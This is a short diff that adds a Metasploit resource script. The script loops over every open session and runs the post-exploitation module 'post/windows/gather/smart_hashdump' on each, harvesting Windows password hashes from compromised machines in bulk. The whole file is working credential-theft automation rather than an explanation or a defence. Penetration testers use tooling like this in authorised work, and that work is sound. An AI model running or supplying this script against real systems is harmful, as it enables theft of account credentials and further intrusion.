@@ -1,0 +1,15 @@
+<ruby>
+modules = ["post/windows/gather/smart_hashdump"]
+sessions = []
+framework.sessions.each do |session|
+  sessions << session
+end
+modules.each do |exec|
+  self.run_single("use #{exec}")
+  puts ("\nRunning #{exec}")
+  sessions.each do |ses|
+		self.run_single("set SESSION #{ses[0]}")
+    self.run_single("run")
+  end
+end
+</ruby>
